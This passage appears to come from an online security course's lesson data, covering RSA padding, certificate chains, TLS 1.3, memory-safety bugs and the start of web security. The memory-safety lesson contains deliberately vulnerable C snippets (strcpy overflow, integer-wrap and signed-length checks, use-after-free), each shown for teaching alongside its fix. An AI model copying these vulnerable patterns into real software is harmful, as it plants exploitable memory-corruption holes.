<li><strong>It is malleable.</strong> (<em>m</em><sub>1</sub><em>m</em><sub>2</sub>)<sup><em>e</em></sup> = <em>m</em><sub>1</sub><sup><em>e</em></sup><em>m</em><sub>2</sub><sup><em>e</em></sup>, so multiplying a ciphertext by 2<sup><em>e</em></sup> mod <em>n</em> doubles the hidden message. For signatures without hashing, signatures on 2 and 3 multiply to a valid signature on 6:</li>
</ul>
<pre><code>s1, s2 = pow(2, d, n), pow(3, d, n)
print(pow(s1 * s2 % n, e, n))   # 6</code></pre>
<ul>
<li><strong>Small messages don't wrap around.</strong> With <em>e</em> = 3, a real 2048-bit <em>n</em> and <em>m</em> = 42, <em>c</em> = 42<sup>3</sup> = 74,088 is far less than <em>n</em>, so "mod <em>n</em>" does nothing, and an ordinary cube root recovers 42 (MATH 121 Lesson 5, practice 5).</li>
</ul>
<p>The cure is <strong>padding</strong>: a randomized, reversible encoding applied before the exponentiation. For encryption the standard is <strong>OAEP</strong> (Optimal Asymmetric Encryption Padding, 1994). Its idea, simplified: pad the message <em>m</em> with a block of zero bytes, and pick fresh random bytes <em>r</em> (32, say). A <em>mask function</em> G stretches any input <em>s</em> to whatever length is needed by hashing it with a counter: G(<em>s</em>) = SHA-256(<em>s</em> ‖ 0) ‖ SHA-256(<em>s</em> ‖ 1) ‖ …, with each counter written as 4 bytes, cut to the length wanted (the standard calls this MGF1). Compute <em>X</em> = (<em>m</em> ‖ zeros) ⊕ G(<em>r</em>), with G's output as long as <em>m</em> ‖ zeros, and <em>Y</em> = <em>r</em> ⊕ G(<em>X</em>), with G's output as long as <em>r</em>. (This G is not the toy H above, which reduced mod <em>n</em>.) The number encrypted is <em>X</em> ‖ <em>Y</em>, which fills almost all of <em>n</em>. The receiver decrypts, recovers <em>r</em> = <em>Y</em> ⊕ G(<em>X</em>), then <em>m</em> ‖ zeros = <em>X</em> ⊕ G(<em>r</em>), and rejects the ciphertext unless the zeros are there. That one structure fixes all three problems: the random <em>r</em> makes each encryption different, the encrypted number is always large, and a tampered ciphertext scrambles the zeros and is rejected. For signatures the corresponding scheme is <strong>RSA-PSS</strong>. Older padding (PKCS #1 version 1.5 encryption) lacked this check and led to Daniel Bleichenbacher's 1998 attack, in which a server that revealed whether padding was valid let an attacker decrypt messages, a cousin of Lesson 2's padding oracle. Vetted libraries implement OAEP and PSS; use them.</p>

<h3>Certificates and chains of trust</h3>
<p>Signatures authenticate a public key only if you already know the signer's public key. How does your browser know that a key really belongs to <code>shop.example</code>? A <strong>certificate</strong> is a signed statement: "the public key of <code>shop.example</code> is (<em>n</em>, <em>e</em>), valid until 30 June 2027", signed by a <strong>certificate authority</strong> (CA). Your operating system or browser ships with a few hundred <strong>root</strong> CA public keys in its <em>trust store</em>. Roots sign certificates for <em>intermediate</em> CAs, which sign the certificates of individual sites. The site sends its certificate and the intermediate's, and the browser checks the <strong>chain</strong> up to a root it trusts.</p>
<figure class="fig"><svg viewBox="0 0 520 140" width="520" role="img" aria-label="A certificate chain: a root CA key in the browser's trust store signs an intermediate CA certificate, which signs the certificate for shop.example.">
<g class="hl"><rect x="20" y="40" width="130" height="56"/></g>
<g class="box"><rect x="195" y="40" width="130" height="56"/><rect x="370" y="40" width="130" height="56"/></g>
<g class="ln"><line x1="150" y1="68" x2="190" y2="68"/><polyline points="184,63 190,68 184,73"/><line x1="325" y1="68" x2="365" y2="68"/><polyline points="359,63 365,68 359,73"/></g>
<g class="text"><text x="85" y="64" text-anchor="middle">Root CA</text><text x="85" y="82" text-anchor="middle" class="m">in trust store</text>
<text x="260" y="64" text-anchor="middle">Intermediate CA</text><text x="260" y="82" text-anchor="middle" class="m">sent by site</text>
<text x="435" y="64" text-anchor="middle">shop.example</text><text x="435" y="82" text-anchor="middle" class="m">sent by site</text>
<text x="170" y="30" text-anchor="middle" class="m">signs</text><text x="345" y="30" text-anchor="middle" class="m">signs</text>
<text x="260" y="125" text-anchor="middle" class="m">each signature is checked with the key in the certificate to its left</text></g>
</svg><figcaption>A chain of trust. Only the root's key is trusted in advance; each certificate's signature is checked with the public key in the certificate before it.</figcaption></figure>
<p>A toy version, with MATH 121's key standing in for the CA's:</p>
<pre><code>def rsa_sign(data, n, d):
    return pow(H(data, n), d, n)

def rsa_verify(data, sig, n, e):
    return pow(sig, e, n) == H(data, n)

def tbs(cert):                     # "to be signed": the certificate's fields in a fixed order
    return repr(sorted(cert.items())).encode()

cert = {"subject": "shop.example", "key": (1022117, 65537), "issuer": "Toy Root CA", "not_after": "2027-06-30"}
sig = rsa_sign(tbs(cert), 3233, 2753)
print(rsa_verify(tbs(cert), sig, 3233, 17))   # True
fake = dict(cert, subject="evil.example")
print(rsa_verify(tbs(fake), sig, 3233, 17))   # False</code></pre>
<p>Real certificates use the X.509 format, and checking one involves more than the signature: the name must match the site requested, the current date must be within its validity period, each CA in the chain must be marked as allowed to sign certificates, and the certificate mustn't have been revoked. Every check that is skipped has been exploited somewhere. The system is only as strong as the least careful trusted CA: a CA that wrongly issues a certificate for <code>shop.example</code> enables a perfect man in the middle. Since 2018, browsers have required new certificates to be logged in public, append-only <em>Certificate Transparency</em> logs, so that wrongly issued certificates can at least be spotted.</p>

<h3>How TLS puts it together</h3>
<p>TLS (Transport Layer Security), the protocol behind HTTPS, combines every piece so far. A TLS 1.3 handshake (RFC 8446), simplified:</p>
<ol>
<li><strong>ClientHello</strong>: the client sends a random value, the cipher suites it supports, and its half of an elliptic-curve Diffie–Hellman exchange (a <em>key share</em>).</li>
<li><strong>ServerHello</strong>: the server sends its random value and key share. Both now compute the shared secret and derive handshake keys with HKDF; everything after this point is encrypted.</li>
<li>The server sends its <strong>certificate chain</strong>, then <strong>CertificateVerify</strong>: a signature, with the certificate's private key, over a hash of the whole handshake so far. This authenticates the Diffie–Hellman exchange and defeats the man in the middle, who can't sign as the server.</li>
<li>Both sides send <strong>Finished</strong>: an HMAC over the handshake, proving that each saw the same messages.</li>
<li>Application data flows, protected by AEAD (AES-GCM or ChaCha20-Poly1305) with keys derived from the shared secret.</li>
</ol>
<p>The handshake takes one round trip before data can flow, and fresh Diffie–Hellman secrets for every connection give forward secrecy. The CS 330 networks course, taken alongside this one, places TLS between TCP and HTTP; this course's Lesson 8 returns to what TLS does and doesn't protect.</p>
<p class="note">Why it matters: you will rarely implement these algorithms, but you will configure them, check certificates, and decide what to sign. Knowing why each piece exists (padding, authentication of key exchange, chain checks) is how you notice when one has been left out.</p>
`,
      terms: [
        ["Public-key cryptography", "Cryptography with a key pair: a public key anyone may know and a private key only its owner holds."],
        ["Diffie–Hellman key exchange", "Two parties publish g^a and g^b mod p and each computes the shared secret g^(ab) mod p."],
        ["Discrete logarithm problem", "Given g, p and g^a mod p, find a; believed infeasible for large well-chosen groups."],
        ["Key derivation function (KDF)", "A function, such as HKDF, that turns a shared secret into uniformly random symmetric keys."],
        ["Forward secrecy", "Compromise of long-term keys doesn't expose past sessions, because each session used fresh secrets that were erased."],
        ["Man-in-the-middle attack", "An attacker relays and alters messages between two parties, each of whom believes they are talking to the other."],
        ["Digital signature", "A value only the private-key holder can compute over a message, which anyone with the public key can verify."],
        ["Hash-then-sign", "Signing H(m) rather than m, so that any message length can be signed and algebraic forgeries fail."],
        ["Textbook RSA", "RSA applied to messages directly, without padding; deterministic and malleable."],
        ["OAEP", "Optimal Asymmetric Encryption Padding: randomized, checkable padding for RSA encryption."],
        ["RSA-PSS", "The standard randomized padding scheme for RSA signatures."],
        ["Certificate", "A statement binding a name to a public key, signed by a certificate authority."],
        ["Certificate authority (CA)", "An organization trusted to sign certificates after checking who controls a name."],
        ["Chain of trust", "A sequence of certificates, each signed by the next, ending at a root key the verifier already trusts."],
        ["TLS", "Transport Layer Security: authenticated key exchange followed by AEAD-protected records; the S in HTTPS."]
      ],
      quiz: [
        { q: "With p = 23, g = 5, Alice's secret a = 6 and Bob's public value B = 19, what is the shared secret?", choices: ["8", "2", "19", "6"], answer: 1, why: "B^a mod p = 19^6 mod 23 = 2, the same as A^b." },
        { q: "Why does unauthenticated Diffie–Hellman fail against an active attacker?", choices: ["The discrete log is easy", "The attacker can substitute her own public values and agree separate keys with each side", "The shared secret is sent in the clear", "It uses small primes"], answer: 1, why: "Nothing proves who sent g^a, so a man in the middle can run two exchanges." },
        { q: "In RSA signatures, which key signs?", choices: ["The public exponent e", "The private exponent d", "Either", "The modulus n"], answer: 1, why: "Only the private key holder can produce H(m)^d mod n; anyone checks with e." },
        { q: "Why is textbook RSA encryption unsafe even with a 2048-bit key?", choices: ["2048 bits can be factored", "It is deterministic and malleable, so equal messages are visible and ciphertexts can be altered meaningfully", "It is too slow", "It can't encrypt numbers"], answer: 1, why: "Padding such as OAEP adds randomness and an integrity check." },
        { q: "A browser receives a valid certificate chain for bank.example, signed up to a trusted root, but the page requested was bank-example.net. What should it do?", choices: ["Accept: the chain is valid", "Reject: the certificate's name doesn't match the site requested", "Accept if the root is well known", "Ask the server again"], answer: 1, why: "A valid certificate for another name proves nothing about this one." },
        { q: "What does the CertificateVerify message in TLS 1.3 prevent?", choices: ["Replay of old records", "A man in the middle substituting his own key share, since he can't sign the handshake with the server's private key", "Weak passwords", "Certificate expiry"], answer: 1, why: "The signature covers the handshake, including both key shares." }
      ],
      practice: [
        {
          q: `<p>Run Diffie–Hellman with <em>p</em> = 23, <em>g</em> = 5, and Mallory in the middle with secret <em>m</em> = 13. Alice's and Bob's secrets are 6 and 15 as in the notes. Compute the value Mallory sends to each, the key Alice ends up with, and the key Bob ends up with, and check that Mallory can compute both.</p>`,
          a: `<pre><code>p, g, a, b, m = 23, 5, 6, 15, 13
M = pow(g, m, p)
print(M)   # 21
k_alice, k_bob = pow(M, a, p), pow(M, b, p)
print(k_alice, k_bob)   # 18 7
print(pow(pow(g, a, p), m, p), pow(pow(g, b, p), m, p))   # 18 7</code></pre><p>Mallory sends 21 to both. Alice computes 21<sup>6</sup> mod 23 = 18 and Bob 21<sup>15</sup> mod 23 = 7; Mallory computes the same two keys from the values 8 and 19 she intercepted. She decrypts each message with one key and re-encrypts it with the other.</p>`
        },
        {
          q: `<p>An auction encrypts each sealed bid with the auctioneer's public RSA key using textbook RSA, and bids are whole numbers of dollars up to 10,000. Explain how another bidder who sees the ciphertexts can learn every bid, and how a malleability attack could let them always bid just above a rival without knowing the rival's bid.</p>`,
          a: `<p>The public key is public, so the eavesdropper encrypts 1, 2, …, 10,000 and compares each result with the ciphertexts: textbook RSA is deterministic, so a match reveals the bid. For the second attack: multiplying a ciphertext <em>c</em> = <em>m</em><sup><em>e</em></sup> by 2<sup><em>e</em></sup> mod <em>n</em> gives the encryption of 2<em>m</em>, without knowing <em>m</em>. Submitting that would always double a rival's bid; more generally, malleability lets an attacker produce ciphertexts related to ones they can't read. OAEP prevents both: the random padding makes each encryption different, and altered ciphertexts fail the padding check.</p>`
        },
        {
          q: `<p>Using <code>rsa_sign</code>, <code>rsa_verify</code> and <code>tbs</code> from the notes, find a second message whose toy hash <code>H(data, 3233)</code> equals that of <code>tbs(cert)</code>, by trying <code>b"x" + str(i).encode()</code> for <em>i</em> = 0, 1, 2, …. How many tries did it take, and what does that show about the toy's modulus?</p>`,
          a: `<pre><code>target = H(tbs(cert), 3233)
i = 0
while H(b"x" + str(i).encode(), 3233) != target:
    i += 1
print(i)   # 235
print(rsa_verify(b"x" + str(i).encode(), sig, 3233, 17))   # True</code></pre><p>Here the 236th try (<em>i</em> = 235) matched; on average it takes about 3,233, since each try matches with probability 1/3233. Then the CA's signature verifies on the new message: a forgery. Reducing a 256-bit hash mod a 12-bit <em>n</em> throws away almost all of its collision resistance. Real RSA keys are larger than the hash, so the hash isn't reduced, and PSS encodes it into a full-size number.</p>`
        },
        {
          q: `<p>For each failure, say which TLS or certificate check would catch it, or that none would: (a) a café's Wi-Fi intercepts connections and presents a self-signed certificate for shop.example; (b) an attacker holds a stolen copy of shop.example's private key and its valid certificate; (c) last year's traffic to shop.example was recorded, and the server's private key is stolen today.</p>`,
          a: `<p>(a) The chain check: a self-signed certificate doesn't chain to a trusted root, so the browser warns and (for sites that require HTTPS) refuses. (b) No check catches it: the attacker can sign CertificateVerify exactly as the server can and impersonate the site until the certificate is revoked or expires. That is why private keys belong in hardware or tightly restricted storage, and why revocation exists. (c) Forward secrecy saves the recorded traffic: TLS 1.3's session keys came from fresh Diffie–Hellman secrets that were erased; the stolen signing key was only used to authenticate, not to encrypt. (With old RSA key transport, removed in TLS 1.3, the stolen key would have decrypted it all.)</p>`
        }
      ],
      sources: ["dh76", "bonehshoup", "rfc8446", "mcs"]
    },
    {
      id: "sc5",
      title: "Memory safety",
      minutes: 90,
      summary: "How a stack buffer overflow overwrites a return address, traced through a real GCC stack frame; out-of-bounds reads; integer overflow and signedness bugs in size checks; use-after-free; and what each defense (bounds-checked APIs, stack canaries, non-executable memory, ASLR, control-flow integrity, sanitizers, memory-safe languages) does and doesn't stop.",
      notes: `
<p>CS 210 Lesson 6 showed that a stack frame holds a function's local arrays just below its saved frame pointer and return address, and that copying too much input into a local array overwrites the return address. CS 210 Lesson 4 listed the C memory bugs (out of bounds, use after free, dangling pointers) and the fact that about 70% of the serious vulnerabilities Microsoft and Google fix are of these kinds. This lesson explains why those bugs give an attacker control rather than just a crash, and what each layer of defense really does. It explains mechanisms at the level of a textbook; it doesn't build working exploits.</p>

<h3>A real frame</h3>
<p>Here is a function with the classic bug: <code>strcpy</code> copies bytes up to and including the terminating 0, with no idea how large the destination is.</p>
<pre data-label="C"><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void greet(const char *name) {
    char buf[16];
    strcpy(buf, name);              /* no length check */
    printf("Hello, %s\\n", buf);
}

int main(int argc, char **argv) {
    greet(argc &gt; 1 ? argv[1] : "world");
    return 0;
}</code></pre>
<p>Compiled with <code>gcc -O0 -fno-stack-protector</code> on x86-64 Linux, <code>greet</code> begins <code>pushq %rbp; movq %rsp, %rbp; subq $32, %rsp</code> and passes <code>leaq -16(%rbp), %rax</code> to <code>strcpy</code>: <code>buf</code> occupies the 16 bytes from %rbp − 16 to %rbp − 1. Directly above it, at %rbp, is the caller's saved %rbp (8 bytes), and above that, at %rbp + 8, the return address that <code>call</code> pushed. So the first 16 bytes of input fill <code>buf</code>, bytes 16 to 23 overwrite the saved %rbp, and bytes 24 to 31 overwrite the return address. With a 40-byte argument the program crashes with a segmentation fault when <code>greet</code> executes <code>ret</code> and jumps to the address 0x4141414141414141 made of the letter A (0x41), which isn't mapped. An attacker who chooses the bytes chooses where <code>ret</code> jumps.</p>
<figure class="fig"><svg viewBox="0 0 460 250" width="460" role="img" aria-label="The stack frame of greet compiled with a stack protector. From high addresses to low: return address, saved rbp, canary, 8 unused bytes, then buf of 16 bytes. An arrow shows that an overflow of buf writes upward toward the canary and the return address.">
<g class="box"><rect x="120" y="20" width="200" height="34"/><rect x="120" y="54" width="200" height="34"/><rect x="120" y="122" width="200" height="34"/><rect x="120" y="156" width="200" height="68"/></g>
<g class="hl"><rect x="120" y="88" width="200" height="34"/></g>
<g class="text"><text x="220" y="42" text-anchor="middle">return address</text><text x="220" y="76" text-anchor="middle">saved %rbp</text><text x="220" y="110" text-anchor="middle">canary</text><text x="220" y="144" text-anchor="middle" class="m">unused (8 bytes)</text><text x="220" y="195" text-anchor="middle">buf[16]</text>
<text x="112" y="42" text-anchor="end" class="m">%rbp + 8</text><text x="112" y="76" text-anchor="end" class="m">%rbp</text><text x="112" y="110" text-anchor="end" class="m">%rbp − 8</text><text x="112" y="144" text-anchor="end" class="m">%rbp − 16</text><text x="112" y="195" text-anchor="end" class="m">%rbp − 32</text>
<text x="390" y="40" text-anchor="middle" class="m">higher</text><text x="390" y="230" text-anchor="middle" class="m">lower</text><text x="368" y="135" class="m">overflow</text></g>
<g class="ln"><line x1="360" y1="215" x2="360" y2="40"/><polyline points="355,48 360,40 365,48"/></g>
</svg><figcaption>greet's frame with <code>-fstack-protector-strong</code> (GCC 13, x86-64). The compiler moves buf down and places a random canary between it and the saved registers. strcpy writes upward from buf, so it must overwrite the canary before it can reach the return address.</figcaption></figure>

<h3>Stack canaries</h3>
<p>Ubuntu's GCC enables <code>-fstack-protector-strong</code> by default, and with it the same function compiles differently. The canary is kept in <em>thread-local storage</em>, a small per-thread memory area whose address the operating system keeps in the <code>%fs</code> segment register; <code>%fs:40</code> means "the 8 bytes at offset 40 in that area". The C library picks one random canary when the program starts and stores it there; each new thread gets its own area with a copy of the same value, so there is one canary per process, kept in every thread's area.</p>
<pre data-label="x86-64 (excerpt)"><code>    movq    %fs:40, %rax        # load the canary (this thread's copy)
    movq    %rax, -8(%rbp)      # store it just below the saved %rbp
    ...                         # strcpy into buf at -32(%rbp), printf
    movq    -8(%rbp), %rax
    subq    %fs:40, %rax        # is the stored copy unchanged?
    je      .L2
    call    __stack_chk_fail    # no: abort
.L2:
    leave
    ret</code></pre>
<p>Now the long argument produces:</p>
<pre data-label="Output"><code>*** stack smashing detected ***: terminated</code></pre>
<p>and the process is aborted before <code>ret</code> uses the corrupted address. The canary is chosen randomly when the program starts, and on Linux its lowest byte is 0, so a string copy that tries to reproduce it stops at that byte. Canaries have limits. They detect only overwrites that pass through the canary on the way up, not a write through a bad index that jumps straight to the return address, nor overwrites of other locals and pointers below it. And a separate bug that leaks memory contents can reveal the canary's value.</p>

<h3>Out-of-bounds reads</h3>
<p>Reading past a buffer doesn't change control flow, but it can leak whatever lies next to the buffer in memory: keys, passwords, other users' data, or a canary or address that defeats another defense. The Heartbleed sidebar tells the story of the most famous one. The pattern is always the same: a length taken from the input ("send me back these 64,000 bytes") is trusted instead of being checked against how much data really exists.</p>

<h3>Integer overflow</h3>
<p>Size computations happen in fixed-width integers (CS 210 Lesson 1), and an overflow can make a check pass that should fail. Two classic shapes:</p>
<pre data-label="C"><code>/* 1. The sum wraps around. */
uint32_t length = read_u32(packet);          /* attacker-controlled */
if (length + HEADER &lt;= LIMIT) {              /* 4294967290 + 16 wraps to 10 */
    memcpy(buf, packet + 4, length);         /* copies about 4 GB into buf */
}

/* 2. A signed length passes an upper-bound check. */
int copy(char *dst, const char *src, int len) {   /* dst holds 64 bytes */
    if (len &gt; 64) return -1;                  /* len = -1 passes */
    memcpy(dst, src, len);                   /* memcpy takes size_t: -1 becomes 18446744073709551615 */
    return 0;
}</code></pre>
<p>Python's integers don't overflow, so to reason about such code we simulate the wrap (the programming problem builds on this):</p>
<pre><code>def u32(x):
    return x &amp; 0xFFFFFFFF          # keep the low 32 bits: x mod 2**32

print(u32(4294967290 + 16))   # 10
print(u32(65536 * 65536))   # 0</code></pre>
<p>The second line is the multiplication bug: <code>malloc(count * size)</code> with count = size = 65,536 asks for 0 bytes (or, with other values, a small number), and the loop that then writes <code>count</code> items runs far past the allocation. That's why <code>calloc(count, size)</code> checks the product for overflow itself. The fixes are to check without overflowing (compare <code>length</code> with <code>LIMIT - HEADER</code>, after checking that <code>HEADER &lt;= LIMIT</code>), to use unsigned <code>size_t</code> for sizes consistently, and to use compiler built-ins such as GCC's <code>__builtin_mul_overflow</code>, which report whether an operation overflowed.</p>

<h3>Use after free</h3>
<p>After <code>free(p)</code>, the allocator may hand the same block to the next <code>malloc</code> of a similar size (CS 210 Lesson 4's allocator, and the first-fit problem there, did exactly that). A program that keeps using <code>p</code> is then reading and writing an object that now belongs to someone else:</p>
<pre data-label="C"><code>struct session { char user[32]; void (*on_logout)(void); };

struct session *s = malloc(sizeof *s);
...
free(s);                                   /* the session ends, but s is still used below */
char *note = malloc(sizeof(struct session)); /* may return the same block */
memcpy(note, text_from_user, sizeof(struct session));
s-&gt;on_logout();                            /* calls through whatever bytes the user wrote there */</code></pre>
<p>If attacker-controlled data lands where a function pointer used to be, the call goes where the attacker chose. Use-after-free bugs are a leading class of browser vulnerabilities because browsers create and destroy millions of objects under the control of web pages' scripts. Related bugs are the <em>double free</em> (freeing the same block twice corrupts the allocator's own lists) and the <em>dangling pointer</em>. Setting <code>s = NULL</code> after <code>free</code> helps only if no other copy of the pointer exists, which is the hard part.</p>

<h3>Defenses, layer by layer</h3>
<ul>
<li><strong>Bounds-checked code</strong> is the only real fix: <code>fgets(buf, sizeof buf, stdin)</code> instead of <code>gets</code>, <code>snprintf</code> instead of <code>sprintf</code>, and functions that take a destination size. Every length that comes from input is checked against the real size of the data and of the destination.</li>
<li><strong>Non-executable memory</strong> (NX, also called DEP, data execution prevention): page-table entries carry an executable permission bit (CS 230 Lesson 7; CS 210 Lesson 6's non-executable stack uses it), and the stack and heap are mapped writable but not executable, a policy called W^X (write xor execute). Bytes an attacker injects as data can't be run as code.</li>
<li><strong>ASLR</strong> (address space layout randomization): the stack, heap, libraries and, for position-independent executables, the program itself are placed at random addresses each run, so an attacker doesn't know where anything useful is. A memory leak that reveals one address can undo it, since everything in a library moves together.</li>
<li><strong>Code reuse and control-flow integrity.</strong> NX stopped injected code, so attackers turned to reusing code already in the program: <em>return-oriented programming</em> chains short existing instruction sequences that end in <code>ret</code>. Defenses check that control flow follows legitimate paths: <em>shadow stacks</em> (a second, protected copy of return addresses, supported in hardware by recent Intel and AMD processors and used by Linux and Windows) make <code>ret</code> fault if the two copies disagree, and <em>control-flow integrity</em> checks that indirect calls go to valid targets.</li>
<li><strong>Finding bugs first</strong>: AddressSanitizer (CS 210 Lesson 4) reports out-of-bounds accesses and use-after-free when they happen during testing, and fuzzing (Lesson 8) generates the inputs that trigger them.</li>
<li><strong>Memory-safe languages</strong> remove the bug classes. Python, Java and Go check every index and free memory automatically, so out-of-bounds writes and use-after-free can't happen in ordinary code. Rust gets the same guarantees without a garbage collector: its compiler rejects programs that could use a value after it is freed or modify it while it is shared.</li>
</ul>
<pre><code>buf = bytearray(16)
try:
    buf[20] = 65
except IndexError as e:
    print(e)   # bytearray index out of range</code></pre>
<p>Each mitigation raises the cost of exploitation, and attackers have found ways past each one alone, usually by combining a leak with an overwrite. That is defense in depth (Lesson 1) working as intended: a real exploit today often needs two or three separate bugs. It is also why governments and companies now push new systems code toward memory-safe languages.</p>
<p class="note">Why it matters: memory corruption turns a programming mistake into someone else running code on your machine. If you write C or C++, check every length; when you can choose, choose a language where the compiler or runtime checks for you.</p>
`,
      terms: [
        ["Memory safety", "The guarantee that a program only reads and writes memory inside objects it validly holds."],
        ["Stack buffer overflow", "Writing past a local array, which can overwrite saved registers and the return address."],
        ["Out-of-bounds read", "Reading past the end of a buffer, which can leak adjacent memory."],
        ["Integer overflow", "A fixed-width arithmetic result that wraps around, which can make a size check pass wrongly."],
        ["Signedness bug", "A negative signed value converted to a huge unsigned one, for example a length passed to memcpy."],
        ["Use after free", "Using memory through a pointer after it has been freed and possibly reallocated to another object."],
        ["Double free", "Freeing the same block twice, which corrupts the allocator's data structures."],
        ["Stack canary", "A random value placed between local buffers and saved registers, checked before the function returns."],
        ["NX / DEP", "Marking data pages, such as the stack and heap, as not executable."],
        ["W^X", "The policy that no memory page is both writable and executable."],
        ["ASLR", "Address space layout randomization: loading code and data at random addresses each run."],
        ["Return-oriented programming", "An attack that chains existing instruction sequences ending in ret, to avoid needing executable injected code."],
        ["Shadow stack", "A protected second copy of return addresses, checked on every return."],
        ["Control-flow integrity (CFI)", "Checking at run time that indirect jumps and calls go only to valid targets."],
        ["Memory-safe language", "A language, such as Python, Java, Go or Rust, whose rules prevent out-of-bounds access and use after free in ordinary code."]
      ],
      quiz: [
        { q: "In the unprotected greet frame, buf is at %rbp − 16. How many bytes of input are written before the copy reaches the first byte of the return address?", choices: ["16", "24", "8", "32"], answer: 1, why: "16 bytes of buf plus 8 bytes of saved %rbp; byte 24 is the first byte of the return address at %rbp + 8." },
        { q: "What does a stack canary detect?", choices: ["Any memory bug", "A contiguous overwrite that passes from a local buffer toward the saved registers and return address", "Use after free", "Integer overflow"], answer: 1, why: "It is checked before ret; writes that skip over it or hit other data aren't detected." },
        { q: "With uint32_t arithmetic, length = 4294967290 and HEADER = 16, what does length + HEADER equal?", choices: ["4294967306", "10", "0", "It is an error"], answer: 1, why: "4294967306 mod 2^32 = 10, so a check against a limit of 4096 passes." },
        { q: "Which defense stops an attacker running machine code they wrote into a stack buffer, but not return-oriented programming?", choices: ["ASLR", "NX (non-executable stack)", "Shadow stacks", "Memory-safe languages"], answer: 1, why: "NX blocks executing injected bytes; ROP reuses code that is already executable." },
        { q: "Why can a use-after-free bug let an attacker control a function call?", choices: ["free erases the function", "The freed block can be reallocated and filled with attacker data where a function pointer used to be", "malloc is slow", "The stack grows into the heap"], answer: 1, why: "The stale pointer now refers to someone else's bytes, which the program still interprets as the old object." },
        { q: "Why is a memory-safe language a stronger fix than canaries, NX and ASLR together?", choices: ["It is faster", "It removes the bug classes rather than making exploitation harder", "It makes binaries smaller", "It disables the stack"], answer: 1, why: "Mitigations raise the cost of exploiting a bug; checked indexing and automatic memory management prevent the bug." }
      ],
      practice: [
        {
          q: `<p>With the protected frame in the figure (buf at %rbp − 32, canary at %rbp − 8), how long must the string passed to <code>strcpy</code> be (not counting its terminating 0) before the copy changes the canary? Recall that the canary's lowest byte, stored first in memory, is 0.</p>`,
          a: `<p><code>strcpy</code> writes the string and then a 0. The canary starts 24 bytes above buf (32 − 8). A 23-character string writes bytes 0 to 22 plus a 0 at byte 23: nothing reaches the canary. A 24-character string writes its terminator at byte 24, the canary's first byte, which is already 0, so the canary is still unchanged. A 25-character string overwrites that first byte with a non-zero character, and the check fails. So 25 characters. This is why the canary's zero byte matters: an attacker using a string copy can't write the canary's own value back, because the copy stops at the first 0 it would need to write.</p>`
        },
        {
          q: `<p>Find and fix the bug: <code>void *alloc_table(uint32_t n) { return malloc(n * sizeof(struct entry)); }</code>, where <code>sizeof(struct entry)</code> is 16 and the caller then writes <code>n</code> entries. Give a value of <code>n</code> that breaks it (if the multiplication happened in 32 bits) and the corrected code.</p>`,
          a: `<p>If the product is computed in 32 bits, <code>n</code> = 2<sup>28</sup> = 268,435,456 gives 2<sup>32</sup>, which wraps to 0, and <code>malloc(0)</code> returns a tiny block that the caller overruns with 4 GB of writes. (On 64-bit Linux, <code>sizeof</code> has type <code>size_t</code>, 64 bits, so this particular line is safe there; the same code with <code>uint32_t</code> sizes, or on a 32-bit system, isn't.) Fix: <code>if (n &gt; SIZE_MAX / sizeof(struct entry)) return NULL; return malloc(n * sizeof(struct entry));</code>, or simply <code>return calloc(n, sizeof(struct entry));</code>, which does that check and also zeroes the memory.</p>`
        },
        {
          q: `<p>A parser reads a record whose first two bytes give the length of a name field, then copies that many bytes into a 256-byte buffer. List every check the C code must make before copying, and say which bug each prevents.</p>`,
          a: `<p>(1) The input has at least 2 bytes, so that reading the length doesn't read past the input (out-of-bounds read). (2) The claimed length is at most the number of bytes actually remaining in the input after the length field (Heartbleed: trusting a length that exceeds the data). (3) The length is at most 256, or 255 if a terminating 0 will be added (stack or heap overflow of the buffer). (4) The arithmetic in these checks can't overflow: compute "remaining = input_len − 2" only after check 1, and compare the claimed length with <code>remaining</code> rather than computing <code>2 + length &lt;= input_len</code> in a narrow type. Use an unsigned type for the length so that it can't be negative.</p>`
        },
        {
          q: `<p>ASLR randomizes where a library is loaded, but the offsets between functions inside the library stay fixed. Explain why a bug that leaks a single pointer into the C library defeats ASLR for the whole library, and what that implies about treating information leaks as "only" confidentiality problems.</p>`,
          a: `<p>If the attacker learns the run-time address of one function in the library and knows (from their own copy of the same library) its offset from the library's start, they subtract to get the library's base address. Every other function and instruction sequence is at base + its known offset, so the randomization is gone for the entire library. So an information leak, even of a single address, is often the first step of an exploit chain: it turns a hard-to-exploit overwrite into a reliable one. Leaks deserve the same urgency as memory corruption bugs.</p>`
        }
      ],
      sources: ["csapp", "aleph1", "anderson20"]
    },
    {
      id: "sc6",
      title: "Web security",
      minutes: 90,
      summary: "Origins and the same-origin policy, and what it doesn't stop; cookies and sessions with the Secure, HttpOnly and SameSite attributes; SQL injection in depth (UNION and blind extraction, second-order injection) and its defenses; cross-site scripting and context-aware output encoding; cross-site request forgery and its defenses; and Content Security Policy as a second layer.",
      notes: `
<p>A web browser runs code from every site you visit, side by side, while holding your logins to all the others. That arrangement is only safe because of a few rules that browsers enforce and a few disciplines that servers must follow. CS 240 Lesson 6 introduced HTTP requests and responses, and CS 240 Lesson 8 and CS 340 Lesson 3 showed injection and parameterized queries. This lesson puts the web's main attacks and defenses together.</p>

<h3>Origins and the same-origin policy</h3>
<p>An <strong>origin</strong> is the triple (scheme, host, port) of a URL. <code>https://shop.example/cart</code> and <code>https://shop.example:443/login</code> have the same origin (443 is HTTPS's default port); <code>http://shop.example</code>, <code>https://api.shop.example</code> and <code>https://shop.example:8443</code> are all different origins.</p>
<pre><code>from urllib.parse import urlsplit

def origin(url):
    u = urlsplit(url)
    return (u.scheme, u.hostname, u.port or {"http": 80, "https": 443}[u.scheme])

print(origin("https://shop.example/cart?id=7"))   # ('https', 'shop.example', 443)
print(origin("https://shop.example:443/login") == origin("https://shop.example/cart"))   # True
print(origin("https://api.shop.example/") == origin("https://shop.example/"))   # False</code></pre>
<p>The <strong>same-origin policy</strong> (SOP) says that a script from one origin can't <em>read</em> data belonging to another: it can't read another origin's pages, the responses to requests it sends there, or its cookies and storage. So a script on <code>evil.example</code> can't read your mail at <code>mail.example</code> in another tab.</p>
<p>What the SOP does <em>not</em> stop matters just as much. A page may still <em>send</em> requests to any origin, by submitting a form or loading an image, and it may embed images, scripts and frames from anywhere. The browser attaches the target site's cookies to those requests. That gap is where request forgery lives. A server can relax the read restriction for chosen origins with <strong>CORS</strong> (cross-origin resource sharing) headers such as <code>Access-Control-Allow-Origin: https://app.example</code>; a server that echoes back any origin it is sent, with credentials allowed, has switched the protection off.</p>

<h3>Cookies and sessions</h3>
